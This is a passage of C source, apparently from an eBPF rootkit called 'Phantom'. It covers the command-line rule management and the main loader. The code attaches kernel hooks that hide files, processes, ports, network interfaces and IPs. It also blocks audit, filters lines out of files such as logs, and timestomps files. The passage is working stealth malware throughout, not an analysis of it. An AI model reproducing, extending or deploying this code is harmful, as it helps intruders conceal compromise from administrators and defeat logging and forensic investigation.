                    free(cfg->files[i]);
                    for (int j = i; j < cfg->file_count - 1; j++)
                        cfg->files[j] = cfg->files[j + 1];
                    cfg->file_count--;
                    return 0;
                }
            }
            fprintf(stderr, "File hide rule not found: %s\n", target);
            return -1;
        }
        if (!strcmp(action, "hide-prefix")) {
            for (int i = 0; i < cfg->prefix_count; i++) {
                if (!strcmp(cfg->prefixes[i], target)) {
                    free(cfg->prefixes[i]);
                    for (int j = i; j < cfg->prefix_count - 1; j++)
                        cfg->prefixes[j] = cfg->prefixes[j + 1];
                    cfg->prefix_count--;
                    return 0;
                }
            }
            fprintf(stderr, "File prefix rule not found: %s\n", target);
            return -1;
        }
        fprintf(stderr, "Unknown file action: %s\n", action);
        return -1;
    }

    if (!strcmp(what, "process")) {
        if (arg_start + 2 >= argc) {
            fprintf(stderr, "Usage: phantom del process <hide|hide-prefix> <pid|name|/path>\n");
            return -1;
        }
        const char *action = argv[arg_start + 1];
        const char *target = argv[arg_start + 2];

        if (!strcmp(action, "hide")) {
            char *endp = NULL;
            unsigned long pid = strtoul(target, &endp, 10);
            if (endp != target && *endp == '\0') {
                for (int i = 0; i < cfg->pid_count; i++) {
                    if (cfg->pids[i] == (__u32)pid) {
                        for (int j = i; j < cfg->pid_count - 1; j++)
                            cfg->pids[j] = cfg->pids[j + 1];
                        cfg->pid_count--;
                        return 0;
                    }
                }
                fprintf(stderr, "PID hide rule not found: %s\n", target);
                return -1;
            }
            for (int i = 0; i < cfg->process_name_count; i++) {
                if (!strcmp(cfg->process_names[i], target)) {
                    free(cfg->process_names[i]);
                    for (int j = i; j < cfg->process_name_count - 1; j++)
                        cfg->process_names[j] = cfg->process_names[j + 1];
                    cfg->process_name_count--;
                    return 0;
                }
            }
            fprintf(stderr, "Process hide rule not found: %s\n", target);
            return -1;
        }
        if (!strcmp(action, "hide-prefix")) {
            for (int i = 0; i < cfg->process_path_prefix_count; i++) {
                if (!strcmp(cfg->process_path_prefixes[i], target)) {
                    free(cfg->process_path_prefixes[i]);
                    for (int j = i; j < cfg->process_path_prefix_count - 1; j++)
                        cfg->process_path_prefixes[j] =
                            cfg->process_path_prefixes[j + 1];
                    cfg->process_path_prefix_count--;
                    return 0;
                }
            }
            fprintf(stderr, "Process path prefix not found: %s\n", target);
            return -1;
        }
        fprintf(stderr, "Unknown process action: %s\n", action);
        return -1;
    }

    if (!strcmp(what, "port")) {
        if (arg_start + 2 >= argc) {
            fprintf(stderr, "Usage: phantom del port hide <port>\n");
            return -1;
        }
        if (strcmp(argv[arg_start + 1], "hide")) {
            fprintf(stderr, "Unknown port action: %s\n", argv[arg_start + 1]);
            return -1;
        }
        __u32 port = (__u32)strtoul(argv[arg_start + 2], NULL, 10);
        for (int i = 0; i < cfg->port_count; i++) {
            if (cfg->ports[i] == port) {
                for (int j = i; j < cfg->port_count - 1; j++)
                    cfg->ports[j] = cfg->ports[j + 1];
                cfg->port_count--;
                return 0;
            }
        }
        fprintf(stderr, "Port hide rule not found: %u\n", port);
        return -1;
    }

    if (!strcmp(what, "file-line-hide") || !strcmp(what, "file-replace")) {
        if (arg_start + 1 >= argc) {
            fprintf(stderr, "Usage: phantom del %s <file>:<search>\n", what);
            return -1;
        }

        const char *arg = argv[arg_start + 1];
        const char *colon1 = strchr(arg, ':');
        if (!colon1) {
            fprintf(stderr, "Invalid format: %s\n", arg);
            return -1;
        }

        size_t path_len = colon1 - arg;
        const char *search = colon1 + 1;

        for (int i = 0; i < cfg->file_filter_count; i++) {
            if (!strncmp(cfg->file_filters[i].path, arg, path_len) &&
                !strcmp(cfg->file_filters[i].search, search)) {
                free(cfg->file_filters[i].path);
                free(cfg->file_filters[i].search);
                free(cfg->file_filters[i].replace);

                for (int j = i; j < cfg->file_filter_count - 1; j++) {
                    cfg->file_filters[j] = cfg->file_filters[j + 1];
                }
                cfg->file_filter_count--;
                return 0;
            }
        }

        fprintf(stderr, "Rule not found: %s\n", arg);
        return -1;
    }

    if (!strcmp(what, "file-filter-exempt")) {
        if (arg_start + 1 >= argc) {
            fprintf(stderr, "Usage: phantom del file-filter-exempt <name|/path/to/binary>\n");
            return -1;
        }
        const char *target = argv[arg_start + 1];
        for (int i = 0; i < cfg->file_filter_exempt_count; i++) {
            if (!strcmp(cfg->file_filter_exempts[i], target)) {
                free(cfg->file_filter_exempts[i]);
                for (int j = i; j < cfg->file_filter_exempt_count - 1; j++)
                    cfg->file_filter_exempts[j] = cfg->file_filter_exempts[j + 1];
                cfg->file_filter_exempt_count--;
                return 0;
            }
        }
        fprintf(stderr, "Exempt not found: %s\n", target);
        return -1;
    }

    if (!strcmp(what, "timestomp")) {
        if (arg_start + 1 >= argc) {
            fprintf(stderr, "Usage: phantom del timestomp <file|all>\n");
            return -1;
        }

        const char *target = argv[arg_start + 1];

        if (!strcmp(target, "all")) {
            /* timestomp all */
            for (int i = 0; i < cfg->timestomp_rule_count; i++) {
                free(cfg->timestomp_rules[i].path);
                free(cfg->timestomp_rules[i].timestamp);
            }
            cfg->timestomp_rule_count = 0;
            free(cfg->global_timestomp_timestamp);
            cfg->global_timestomp_timestamp = NULL;
            cfg->enable_timestomp = false;
            cfg->set_enable_timestomp = true;
            LOG_INFO("All timestomp rules removed");
            return 0;
        }

        /* single timestomp rule by path */
        for (int i = 0; i < cfg->timestomp_rule_count; i++) {
            if (cfg->timestomp_rules[i].path &&
                !strcmp(cfg->timestomp_rules[i].path, target)) {
                free(cfg->timestomp_rules[i].path);
                free(cfg->timestomp_rules[i].timestamp);
                for (int j = i; j < cfg->timestomp_rule_count - 1; j++) {
                    cfg->timestomp_rules[j] = cfg->timestomp_rules[j + 1];
                }
                cfg->timestomp_rule_count--;
                LOG_INFO("Timestomp rule removed for %s", target);
                return 0;
            }
        }

        fprintf(stderr, "Timestomp rule not found: %s\n", target);
        return -1;
    }

    fprintf(stderr, "Unknown del target: %s\n", what);
    return -1;
}

/*
 * parse_args - Scan argv for -v, --debug, -h, and the subcommand.
 *
 * Returns: 0 ok, -1 bad arg, -2 help
 */
static int parse_args(int argc, char **argv,
                      struct phantom_cli_config *cfg,
                      bool *verbose, bool *debug,
                      const char **command)
{
    for (int i = 1; i < argc; i++) {
        const char *a = argv[i];

        if (!strcmp(a, "-h") || !strcmp(a, "--help")) {
            return -2;
        }

        if (!strcmp(a, "-v") || !strcmp(a, "--verbose")) {
            *verbose = true;
            continue;
        }

        if (!strcmp(a, "--debug")) {
            *debug = true;
            continue;
        }

        if (is_command(a)) {
            *command = a;
            break;
        }

        return -1;
    }

    return 0;
}

// ============================================================
// Main
// ============================================================
/*
 * main - Load BPF, push maps, attach hooks, run status or daemon loop.
 */
int main(int argc, char **argv)
{
    struct phantom_cli_config cfg;
    bool verbose = false;
    bool debug = false;
    const char *command = NULL;
    int err = 0;


    phantom_config_init(&cfg);

    if (phantom_config_load_builtin(&cfg)) {
        err = 1;
        goto cleanup;
    }

    int parse_rc = parse_args(argc, argv, &cfg,
                              &verbose, &debug,
                              &command);
    if (parse_rc == -2) {
        usage(argv[0]);
        goto cleanup;
    }
    if (parse_rc < 0 || !command) {
        usage(argv[0]);
        err = 1;
        goto cleanup;
    }

    /* add: merge rule, save JSON, SIGHUP daemon */
    if (!strcmp(command, "add")) {
        int add_rc = parse_add_args(argc, argv, 2, &cfg);
        if (add_rc < 0) {
            err = 1;
            goto cleanup;
        }
        save_config_to_file(&cfg);
        notify_daemon_reload();
        LOG_INFO("Rule added successfully");
        goto cleanup;
    }

    /* del: remove rule, save JSON, SIGHUP daemon */
    if (!strcmp(command, "del")) {
        int del_rc = parse_del_args(argc, argv, 2, &cfg);
        if (del_rc < 0) {
            err = 1;
            goto cleanup;
        }
        save_config_to_file(&cfg);
        notify_daemon_reload();
        LOG_INFO("Rule removed successfully");
        goto cleanup;
    }

    /* list alias for status */
    if (!strcmp(command, "list")) {
        command = "status";
    }

    /* flush: empty cfg, save, SIGHUP */
    if (!strcmp(command, "flush")) {
        phantom_config_free(&cfg);
        save_config_to_file(&cfg);
        notify_daemon_reload();
        LOG_INFO("All rules flushed");
        goto cleanup;
    }

    if (phantom_config_resolve_processes(&cfg)) {
        err = 1;
        goto cleanup;
    }

    bool enable_files = cfg.enable_files;
    bool enable_procs = cfg.enable_procs;
    bool enable_ports = cfg.enable_ports;
    bool enable_audit = cfg.enable_audit;
    bool enable_timestomp = cfg.enable_timestomp;
    bool enable_exec = cfg.enable_exec;
    bool enable_file_filter = cfg.enable_file_filter;
    bool enable_iface = cfg.enable_iface;
    bool enable_ip = cfg.enable_ip;

    log_set_level(verbose ? LOG_DEBUG : LOG_INFO);

    LOG_INFO("Hide targets: %d file(s), %d prefix(es), %d pid(s) (%d name(s) pending), %d port(s)",
             cfg.file_count, cfg.prefix_count, cfg.pid_count, cfg.process_name_count,
             cfg.port_count);

    /* BPF maps need unlimited memlock on some systems */
    struct rlimit rl = {RLIM_INFINITY, RLIM_INFINITY};
    if (setrlimit(RLIMIT_MEMLOCK, &rl)) {
        LOG_WARN("Failed to set RLIMIT_MEMLOCK: %s", strerror(errno));
    }

    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);
    signal(SIGHUP, sig_handler);

    /*
     * pidfile before slow BPF load so add/del during startup can SIGHUP;
     * reload_config drained before the event loop.
     */
    if (strcmp(command, "daemon") == 0)
        create_pidfile();

    LOG_INFO("Loading Phantom BPF program...");

    skel = phantom_bpf__open();
    if (!skel) {
        LOG_ERROR("Failed to open BPF skeleton: %s", strerror(errno));
        err = 1;
        goto cleanup;
    }

    /*
     * Autoload every program; live SIGHUP only updates maps and feature_config.
     * Hooks use is_config_enabled() when a feature is off.
     */
    {
        struct bpf_program *p;

        bpf_object__for_each_program(p, skel->obj)
            bpf_program__set_autoload(p, true);
    }

    /*
     * recvmsg kretprobe: override attach only when SEC default differs (e.g. arm64).
     * Skip set_attach_target when default matches (libbpf BTF path differs).
     * Target must be syscall wrapper with ALLOW_ERROR_INJECTION for override_return.
     */
    {
        const char *recvmsg_sym = resolve_recvmsg_symbol();
        if (recvmsg_sym && strcmp(recvmsg_sym, "__x64_sys_recvmsg") != 0) {
            /* non-default arch wrapper from kallsyms */
            LOG_INFO("Resolved recvmsg kretprobe symbol: %s (overriding default)",
                     recvmsg_sym);
            err = bpf_program__set_attach_target(
                skel->progs.phantom_recvmsg_override, 0, recvmsg_sym);
            if (err) {
                LOG_WARN("Could not set recvmsg kretprobe target: %s",
                         strerror(-err));
                err = 0;
            }
        } else if (recvmsg_sym) {
            LOG_INFO("Using default recvmsg kretprobe symbol: %s", recvmsg_sym);
        } else {
            LOG_WARN("Could not resolve recvmsg syscall wrapper in /proc/kallsyms");
            LOG_WARN("kretprobe may fail; port hiding works but ss may show '!!!Remnant'");
        }
    }

    err = phantom_bpf__load(skel);
    if (err) {
        LOG_ERROR("Failed to load BPF skeleton: %s", strerror(-err));
        goto cleanup;
    }


    set_config(CFG_ENABLE_FILE_HIDING, enable_files ? 1 : 0);
    set_config(CFG_ENABLE_PROCESS_HIDING, enable_procs ? 1 : 0);
    set_config(CFG_ENABLE_PORT_HIDING, enable_ports ? 1 : 0);
    set_config(CFG_ENABLE_AUDIT_BLOCKING, enable_audit ? 1 : 0);
    set_config(CFG_ENABLE_TIMESTOMP, enable_timestomp ? 1 : 0);
    set_config(CFG_ENABLE_EXEC_HIDING, enable_exec ? 1 : 0);

    set_config(CFG_ENABLE_FILE_FILTER, enable_file_filter ? 1 : 0);
    set_config(CFG_ENABLE_IFACE_HIDING, enable_iface ? 1 : 0);
    set_config(CFG_ENABLE_IP_HIDING, enable_ip ? 1 : 0);
    if (enable_file_filter && cfg.file_filter_count > 0) {
        int frc = apply_file_filter_config(&cfg);
        if (frc)
            LOG_ERROR("Failed to apply file filter config: %s", bpf_errstr(frc));
    }
    if (enable_file_filter && cfg.file_filter_exempt_count > 0) {
        int erc = apply_file_filter_exempts(&cfg);
        if (erc)
            LOG_ERROR("Failed to apply file filter exempts: %s", bpf_errstr(erc));
    }

    for (int i = 0; i < cfg.file_count; i++) {
        const char *base = strrchr(cfg.files[i], '/');
        const char *keyname = (base && *(base + 1)) ? (base + 1) : cfg.files[i];
        LOG_INFO("Hiding file: %s (key=%s)", cfg.files[i], keyname);
    }
    for (int i = 0; i < cfg.prefix_count; i++)
        LOG_INFO("Hiding prefix: %s", cfg.prefixes[i]);
    for (int i = 0; i < cfg.pid_count; i++)
        LOG_INFO("Hiding PID: %u", cfg.pids[i]);
    for (int i = 0; i < cfg.port_count; i++)
        LOG_INFO("Hiding port: %u", cfg.ports[i]);
    for (int i = 0; i < cfg.exec_name_count; i++)
        LOG_INFO("Capturing exec: %s", cfg.exec_names[i]);
    for (int i = 0; i < cfg.iface_count; i++)
        LOG_INFO("Hiding iface: %s", cfg.iface_names[i]);
    for (int i = 0; i < cfg.ip_count; i++)
        LOG_INFO("Hiding IP: %s", cfg.ip_addrs[i]);
    for (int i = 0; i < cfg.file_filter_exempt_count; i++)
        LOG_INFO("File-filter exempt: %s", cfg.file_filter_exempts[i]);

    {
        int prc = apply_hide_config(cfg.files, cfg.file_count,
                                    cfg.prefixes, cfg.prefix_count,
                                    (__u32 *)cfg.pids, cfg.pid_count,
                                    (__u32 *)cfg.ports, cfg.port_count,
                                    cfg.set_ppid ? cfg.target_ppid : 0);
        if (prc)
            LOG_ERROR("Failed to apply hide config: %s", bpf_errstr(prc));
    }

    {
        int lrc = apply_proc_path_lpm(&cfg);
        if (lrc)
            LOG_ERROR("Failed to apply proc path LPM: %s", bpf_errstr(lrc));
    }

    {
        int irc = apply_iface_ip_config(&cfg);
        if (irc)
            LOG_ERROR("Failed to apply iface/IP config: %s", bpf_errstr(irc));
    }

    if (cfg.enable_timestomp) {
        apply_timestomps(&cfg);
    }

    for (int i = 0; i < cfg.exec_name_count; i++) {
        char key[16] = {};
        strncpy(key, cfg.exec_names[i], sizeof(key) - 1);
        __u8 val = 1;
        int rc = bpf_map__update_elem(skel->maps.hidden_exec_names,
                                      key, sizeof(key),
                                      &val, sizeof(val),
                                      BPF_ANY);
        if (rc) {
            LOG_ERROR("Failed to add exec name %s: %s", cfg.exec_names[i], bpf_errstr(rc));
        }
    }

    /*
     * Attach all programs once; enable/disable via feature_config on SIGHUP.
     * recvmsg/read kretprobes are optional (ATTACH_OPT warns and continues).
     */
    LOG_INFO("Attaching BPF programs...");
    link_count = 0;

    {
        #define ATTACH_REQ(prog) do { \
            links[link_count] = bpf_program__attach(skel->progs.prog); \
            if (!links[link_count++]) { err = -errno; goto attach_fail; } \
        } while (0)

        #define ATTACH_OPT(prog, warn1, warn2) do { \
            links[link_count] = bpf_program__attach(skel->progs.prog); \
            if (!links[link_count]) { \
                LOG_WARN(warn1); \
                LOG_WARN(warn2); \
                errno = 0; \
            } else { \
                link_count++; \
            } \
        } while (0)

        /* getdents64 file hide */
        ATTACH_REQ(phantom_getdents64_enter);
        ATTACH_REQ(phantom_getdents64_exit);

        /* getdents64 / getdents / exec process hide */
        ATTACH_REQ(phantom_getdents64_enter_proc);
        ATTACH_REQ(phantom_getdents64_exit_proc);
        ATTACH_REQ(phantom_getdents_enter);
        ATTACH_REQ(phantom_getdents_exit);
        ATTACH_REQ(phantom_exec_capture);

        /* openat/read/socket/recvmsg: ports, syslog, iface/IP */
        ATTACH_REQ(phantom_openat_enter);
        ATTACH_REQ(phantom_openat_exit);
        ATTACH_REQ(phantom_read_enter);
        ATTACH_REQ(phantom_read_exit_port);
        ATTACH_REQ(phantom_read_exit_syslog);
        ATTACH_REQ(phantom_socket_enter);
        ATTACH_REQ(phantom_socket_exit);
        ATTACH_REQ(phantom_recvmsg_enter);
        ATTACH_REQ(phantom_recvmsg_exit);
        ATTACH_OPT(phantom_recvmsg_override,
                   "Could not attach recvmsg kretprobe (perf_event_paranoid too high?)",
                   "Port/iface hiding still works via exit hooks; return length may not shorten");

        /* file filter hooks */
        ATTACH_REQ(phantom_openat_enter_filefilter);
        ATTACH_REQ(phantom_openat_exit_filefilter);
        ATTACH_REQ(phantom_read_enter_filefilter);
        ATTACH_REQ(phantom_read_exit_filefilter);
        ATTACH_REQ(phantom_read_override_filefilter);
        ATTACH_REQ(phantom_close_enter_filefilter);

        /* NETLINK_ROUTE, ioctl, /proc/net/dev, AF_PACKET */
        ATTACH_REQ(phantom_recvmsg_enter_route);
        ATTACH_REQ(phantom_recvmsg_exit_route);
        ATTACH_REQ(phantom_ioctl_enter);
        ATTACH_REQ(phantom_ioctl_exit);
        ATTACH_REQ(phantom_openat_enter_dev);
        ATTACH_REQ(phantom_openat_exit_dev);
        ATTACH_REQ(phantom_read_enter_dev);
        ATTACH_REQ(phantom_read_exit_dev);
        ATTACH_REQ(phantom_close_enter_dev);
        ATTACH_OPT(phantom_read_override_dev,
                   "Could not attach read kretprobe for /proc/net/dev hiding",
                   "ifconfig hiding still works via ioctl + read exit (length may not shorten)");
        ATTACH_REQ(phantom_recvmsg_enter_packet);
        ATTACH_REQ(phantom_recvmsg_exit_packet);

        #undef ATTACH_REQ
        #undef ATTACH_OPT
    }

    goto attach_ok;

attach_fail:
    LOG_ERROR("Failed to attach BPF programs: %s", strerror(-err));
    destroy_links();
    goto cleanup;

attach_ok: ;

    LOG_INFO("Phantom loaded successfully!");
    LOG_INFO("Features: files=%s procs=%s ports=%s audit=%s timestomp=%s exec=%s file_filter=%s iface=%s ip=%s",
             enable_files ? "ON" : "off",
             enable_procs ? "ON" : "off",
             enable_ports ? "ON" : "off",
             enable_audit ? "ON" : "off",
             enable_timestomp ? "ON" : "off",
             enable_exec ? "ON" : "off",
             enable_file_filter ? "ON" : "off",
             enable_iface ? "ON" : "off",
             enable_ip ? "ON" : "off");


    if (strcmp(command, "status") == 0) {
        LOG_INFO("Status: All BPF programs loaded and attached");
        dump_hide_config();
        goto cleanup;
    }

    if (strcmp(command, "daemon") == 0) {
        LOG_INFO("Running in daemon mode. Press Ctrl+C to stop.");

        /*
         * Reload after slow BPF load: startup used pre-load cfg;
         * settle coalesced SIGHUP then read latest JSON.
         */
        settle_reload_requests();
        reload_daemon_config();

        struct ring_buffer *rb = ring_buffer__new(
            bpf_map__fd(skel->maps.events),
            handle_event, &debug, NULL);

        if (!rb) {
            LOG_ERROR("Failed to create ring buffer: %s", strerror(errno));
            goto cleanup;
        }

        /* poll events map; SIGHUP reload before each poll when flagged */
        while (running) {
            /* SIGHUP reload */
            if (reload_config) {
                settle_reload_requests();
                reload_daemon_config();
                /* reload may re-set flag; loop before poll */
                continue;
            }

            err = ring_buffer__poll(rb, 1000);
            if (err == -EINTR) {
                /* SIGINT/SIGTERM/SIGHUP: recheck flags, keep looping */
                err = 0;
                continue;
            }
            if (err < 0) {
                LOG_ERROR("Error polling ring buffer: %d", err);
                break;
            }
        }

        ring_buffer__free(rb);
        LOG_INFO("Daemon stopped.");
    }

cleanup:
    remove_pidfile();
    destroy_links();
    if (skel) {
        LOG_INFO("Phantom unloaded.");
        phantom_bpf__destroy(skel);
    }
    phantom_config_free(&cfg);
    if (err < 0)
        return 1;
    return err;
}
